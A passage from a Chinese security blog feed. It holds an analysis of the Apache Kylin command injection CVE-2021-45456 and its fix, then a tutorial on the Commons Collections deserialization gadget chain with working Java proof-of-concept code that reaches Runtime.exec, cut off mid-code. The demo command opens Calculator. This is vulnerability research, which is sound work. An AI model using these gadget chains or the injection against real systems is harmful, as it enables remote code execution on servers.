        <content type="html"><![CDATA[<h1 id="CVE-2021-45456-Apache-Kylin-命令注入"><a href="#CVE-2021-45456-Apache-Kylin-命令注入" class="headerlink" title="CVE-2021-45456 Apache Kylin 命令注入"></a>CVE-2021-45456 Apache Kylin 命令注入</h1><blockquote><p>看着y4er师傅写的分析，第一次看有点懵逼，所以简单的补充一下。</p></blockquote><h2 id="补充分析"><a href="#补充分析" class="headerlink" title="补充分析"></a>补充分析</h2><p>首先漏洞点在该路由的 <strong>dumpProjectDiagnosisInfo</strong>方法中project可控。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534592-9f600b83-9036-45f3-a9a9-c7bc2bae5e48.png" alt="image-20220114222208845"></p><p>跟着进去，可以看到<strong>runDiagnosisCLI</strong>方法之后正常执行命令并且project一直可控。所以非常有机会RCE了!</p><p><img src="https://user-images.githubusercontent.com/63966847/149534609-f5d94546-4965-4580-8d1f-bfcb054127c3.png" alt="image-20220114222316611"></p><p>唯一绕过就是不让 <strong>projectInstance</strong>为null，不然就throw抛异常。所以我们看看projectInstance得到如何获得。</p><p>首先通过 <strong>convertStringToBeAlphanumericUnderscore</strong>方法进行替换，输入 <strong>touch 123</strong>则替换之后就为 <strong>touch123</strong></p><p><img src="https://user-images.githubusercontent.com/63966847/149534631-abb945b7-2bce-4fbe-baa3-e7032f013124.png" alt="image-20220114222541519"></p><p>之后通过 <strong>getProject</strong>方法去找有没有 <strong>touch123</strong>这个项目。看下面是通过<strong>projectMap.get(projectName);</strong>去获得如果有就不会抛异常就成功命令执行。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534653-e78ad090-416d-4ce6-ae15-1fed7012cbea.png" alt="image-20220114222809923"></p><p>所以我们在看看得到才什么类中获取，也就是去看 <strong>projectMap</strong>是指的那个类。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534679-31cc4590-a299-4882-9bee-b8fd9789b776.png" alt="image-20220114222920990"></p><p>然后跟上ProjectInstance，则到了如下代码，可以看到setname进去，所以我们最开始需要setname进去和 <strong>touch123</strong>相同就可以了</p><p><img src="https://user-images.githubusercontent.com/63966847/149534692-aacfd561-fcc5-42ae-94c0-84c342f026be.png" alt="image-20220114223024834"></p><p>向上跟踪</p><p><img src="https://user-images.githubusercontent.com/63966847/149534717-bb589da3-01f3-4f5b-a81b-b62e23419bc9.png" alt="image-20220114223153636"></p><p>然后去跟踪 <strong>createProject</strong>方法，之后到了 <strong>saveProject</strong>方法</p><p><img src="https://user-images.githubusercontent.com/63966847/149534727-a5264b5f-6dce-496d-bccd-90e6e0b4e392.png" alt="image-20220114223350119"></p><p>可以看到传递的是json格式然后去获得name，并且通过isAlphanumericUnderscore判断了，但是如果执行命令肯定set进去的name是 <strong>tuoch123</strong>，巧的是 <strong>tuoch123</strong>刚刚好去绕过。</p><p><img src="https://user-images.githubusercontent.com/63966847/149534845-842825f1-95ee-4028-a70c-d7d63f9651d2.png" alt="image-20220114223924151"></p><p><img src="https://user-images.githubusercontent.com/63966847/149534827-4f56fa4c-6fb9-4a8f-bfd3-2b798e8ab042.png" alt="image-20220114223911294"></p><p>从而成功执行命令。</p><h2 id="演示"><a href="#演示" class="headerlink" title="演示"></a>演示</h2><p>y4er师傅的图</p><p>先创建项目名</p><p><img src="https://user-images.githubusercontent.com/63966847/149534861-95093753-4e7f-4b8d-a552-7218ac5ce038.png" alt="image-20220114224040087"></p><p>执行命令</p><p><img src="https://user-images.githubusercontent.com/63966847/149534871-c0d29304-c9ca-43b5-b2ac-6abae59abe52.png" alt="image-20220114224119476"></p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p><img src="https://user-images.githubusercontent.com/63966847/149534884-ff61e395-b5bc-4c97-94a3-3f07b3105f53.png" alt="image-20220114224356250"></p><p>传入cmd的参数改为projectName而非http传入的project，projectName经过convertStringToBeAlphanumericUnderscore() 处理，所以无法输入非字母数字下划线的字符来触发命令执行。</p><p>(除非单个命令可以创成严重危害。。。。。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>CommonsCollection利用链</title>
      <link href="/2022/11/10/CommonsCollections/"/>
      <url>/2022/11/10/CommonsCollections/</url>
      
        <content type="html"><![CDATA[<h1 id="CommonsCollections利用链"><a href="#CommonsCollections利用链" class="headerlink" title="CommonsCollections利用链"></a>CommonsCollections利用链</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>Apache Commons</code>是<code>Apache</code>开源的Java通用类项目在Java中项目中被广泛的使用，<code>Apache Commons</code>当中有一个组件叫做<code>Apache Commons Collections</code>，主要封装了Java的<code>Collection（集合）</code>相关类对象。</p><p>在<code>Commons Collections</code>中实现了一个<code>TransformedMap类</code>，该类是对 Java 标准数据结构类型<code>Map</code>接口的一个扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变化，而具体的变换逻辑则由<code>Transformer</code>类定义，<code>Transformer</code>在<code>TransformedMap</code>实例化时作为参数传入。</p><p>本条链子的利用版本限制：<code>CommonsCollections 3.1 - 3.2.1</code></p><h2 id="接口类和实现类"><a href="#接口类和实现类" class="headerlink" title="接口类和实现类"></a>接口类和实现类</h2><h3 id="Transformer"><a href="#Transformer" class="headerlink" title="Transformer"></a>Transformer</h3><p><code>Transformer</code>是一个接口类，其功能是提供一个对象转换方法<code>transform</code>，源码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">Transformer</span> &#123;</span><br><span class="line">  <span class="comment">// 将输入对象保持不变的转换为某个输出对象</span></span><br><span class="line">    Object <span class="title function_">transform</span><span class="params">(Object var1)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>实现<code>Transformer</code>接口的类有以下类<br><img src="images/image-20220830225100395.png" alt="image-20220830225100395"></p><p>其中一些实现和调用<code>Transformer</code>接口的重要类为：<code>ConstantTransformer</code>、<code>invokerTransformer</code>、<code>ChainedTransformer</code>和<code>TransformedMap</code>。</p><h3 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h3><p><code>ConstantTransformer</code>类是<code>Transformer</code>接口其中的一个实现类，<code>ConstantTransformer</code>类重写了<code>transformer</code>方法，源码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ConstantTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">6374440726369055124L</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Transformer</span> <span class="variable">NULL_INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>((Object)<span class="literal">null</span>);</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object iConstant;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Transformer <span class="title function_">getInstance</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> (Transformer)(constantToReturn == <span class="literal">null</span> ? NULL_INSTANCE : <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(constantToReturn));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ConstantTransformer</span><span class="params">(Object constantToReturn)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iConstant = constantToReturn;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getConstant</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.iConstant;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>传入的对象不会经过任何改变进行返回，也就是当调用<code>transform</code>方法时会返回构造函数中传入的对象。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> Runtime.class;</span><br><span class="line">        <span class="type">ConstantTransformer</span> <span class="variable">constantTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(obj);</span><br><span class="line">        System.out.println(constantTransformer.transform(obj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220901103831836.png" alt="image-20220901103831836"></p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h3><p><code>InvokerTransformer</code>类在<code>Collections</code>组件中非常重要，也是我们后面构造 exp 的核心类。<code>InvokerTransformer</code>类的<code>transform</code>方法实现了类方法的动态调用，采用反射机制动态调用类方法（发射方法名、参数值可控）并返回该方法执行结果。该部分代码如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">InvokerTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> -<span class="number">8653385846894047688L</span>;</span><br><span class="line">  <span class="comment">// 要调用的方法名称</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> String iMethodName;</span><br><span class="line">  <span class="comment">// 反射参数类型数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Class[] iParamTypes;</span><br><span class="line">  <span class="comment">// 反射参数值数组</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Object[] iArgs;</span><br><span class="line"></span><br><span class="line"> <span class="comment">//省略</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iMethodName = methodName;</span><br><span class="line">        <span class="built_in">this</span>.iParamTypes = paramTypes;</span><br><span class="line">        <span class="built_in">this</span>.iArgs = args;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object input)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (input == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> input.getClass();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">method</span> <span class="operator">=</span> cls.getMethod(<span class="built_in">this</span>.iMethodName, <span class="built_in">this</span>.iParamTypes);</span><br><span class="line">                <span class="keyword">return</span> method.invoke(input, <span class="built_in">this</span>.iArgs);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NoSuchMethodException var4) &#123;</span><br><span class="line">                <span class="comment">//异常处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line">        <span class="type">InvokerTransformer</span> <span class="variable">invokerTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                <span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">        );</span><br><span class="line">        invokerTransformer.transform(Runtime.getRuntime());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220901105358610.png" alt="image-20220901105358610"></p><p>在现实场景下很难通过<code>InvokerTransformer.transform</code>传入<code>Runtime.getRuntime()</code>对象完成命令执行，因此我们需要学习下一个接口实现类<code>ChainedTransformer</code>来构造我们的攻击链。</p><h3 id="ChainedTransformer"><a href="#ChainedTransformer" class="headerlink" title="ChainedTransformer"></a>ChainedTransformer</h3><p><code>ChainedTransformer</code>类封装了<code>Transformer</code>的链式调用，当传入一个<code>Transformer</code>数组时，<code>ChainedTransformer</code>就会依次调用每一个<code>Transformer</code>的<code>transform</code>方法，关键源码如下所示：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ChainedTransformer</span> <span class="keyword">implements</span> <span class="title class_">Transformer</span>, Serializable &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">long</span> <span class="variable">serialVersionUID</span> <span class="operator">=</span> <span class="number">3514945074733160196L</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ChainedTransformer</span><span class="params">(Transformer[] transformers)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.iTransformers = transformers;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">transform</span><span class="params">(Object object)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="built_in">this</span>.iTransformers.length; ++i) &#123;</span><br><span class="line">            object = <span class="built_in">this</span>.iTransformers[i].transform(object);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>贴一张 P 牛画的图<br><img src="images/img.png" alt="img"></p><p>通过<code>ChainedTransformer</code>类实现命令执行<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Object</span> <span class="variable">transformer</span> <span class="operator">=</span> chainedTransformer.transform(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><p><img src="images/image-20220903222648532.png" alt="image-20220903222648532"></p><p>先对上述的<code>poc</code>做一个分析：</p><p><strong>ConstantTransformer</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class)</span><br></pre></td></tr></table></figure><p>传入的<code>java.lang.Runtime</code>类原封不动的返回并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中<br><img src="images/image-20220904212600633.png" alt="image-20220904212600633"></p><p><strong>InvokerTransformer 1</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class, Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                ),</span><br></pre></td></tr></table></figure><p>通过<code>InvokerTransformer</code>类的<code>transform()</code>方法里的反射，获取到<code>java.lang.Runtime</code>类的<code>getMethod()</code>方法并执行<code>getRuntime()</code>方法<br><img src="images/image-20220904213709408.png" alt="image-20220904213709408"></p><p>最后返回<code>java.lang.Runtime.getRuntime()</code>方法并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p><strong>InvokerTransformer 2</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class, Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>, <span class="keyword">new</span> <span class="title class_">Object</span>[<span class="number">0</span>]&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="images/image-20220904230545177.png" alt="image-20220904230545177"></p><p>传入的<code>Method</code>对象通过<code>getClass()</code>获取到反射类<code>java.lang.reflect.Method</code>，接着通过反射获取到<code>invoke()</code>方法执行传入的<code>java.lang.Runtime.getRuntime()</code>方法，返回<code>Runtime</code>对象并作为<code>input</code>参数传入到下一个<code>InvokerTransformer</code>的<code>transform(Object input)</code>方法中</p><p>这里比较有趣的是在最后执行<code>method.invoke(input,null)</code>时代入参数是<code>invoke.invoke(input,null)</code>的形式，依然能执行命令。</p><p><strong>InvokerTransformer 3</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;cmd&#125;</span><br><span class="line">                )</span><br></pre></td></tr></table></figure><p><img src="images/image-20220904232209075.png" alt="image-20220904232209075"></p><p>传入的<code>Runtime</code>实例通过<code>getClass()</code>获取到<code>Runtime</code>类，接着通过反射获取到<code>exec()</code>方法，最后通过<code>invoke()</code>执行传进来的<code>iArgs</code>命令</p><p>至此通过<code>ChainedTransformer</code>类，把<code>ConstantTransformer</code>类和多个<code>InvokerTransformer</code>类实现的<code>transform</code>方法一一执行，完成命令执行的利用链。</p><h3 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a>TransformedMap</h3><p>上述虽然构造了一串巧妙的命令执行利用链，但是仍然遗留下未解决的问题：需要转换对象成<code>ChainedTransformer</code>类型接着执行<code>transform()</code>方法<br><img src="images/image-20220905223858552.png" alt="image-20220905223858552"></p><p>所以我们需要解决以下问题：</p><ol><li>传入恶意的<code>ChainedTransformer</code>类</li><li>调用<code>ChainedTransformer</code>类创建的对象<code>chainedTransformer</code>的<code>transformer()</code>方法执行命令</li></ol><p>这里引入<code>TransformedMap</code>类，<code>org.apache.commons.collections.map.TransformedMap</code>类间接的实现了<code>java.util.Map</code>接口，同时支持对<code>Map</code>的<code>key</code>或者<code>value</code>进行<code>Transformer</code>转换，通过调用<code>decorate()</code>和<code>decorateTransform()</code>方法都可以进入<code>TransformedMap()</code>构造函数<br><img src="images/image-20220913165342046.png" alt="image-20220913165342046"></p><p>可以看到在<code>TransformedMap</code>类中通过<code>checkSetValue()</code>、<code>put()</code>和<code>putAll()</code>方法都可以调用传进来的<code>Transform</code>类（例如<code>InvokerTransformer</code>）的<code>transform()</code>方法<br><img src="images/image-20220913173832979.png" alt="image-20220913173832979"></p><p><img src="images/image-20220913180215864.png" alt="image-20220913180215864"></p><p>POC 如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/1 10:34</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TransformerTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span>&#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> <span class="string">&quot;open -a Calculator.app&quot;</span>;</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="comment">// new Class[0]为占位符</span></span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(</span><br><span class="line">                        <span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span 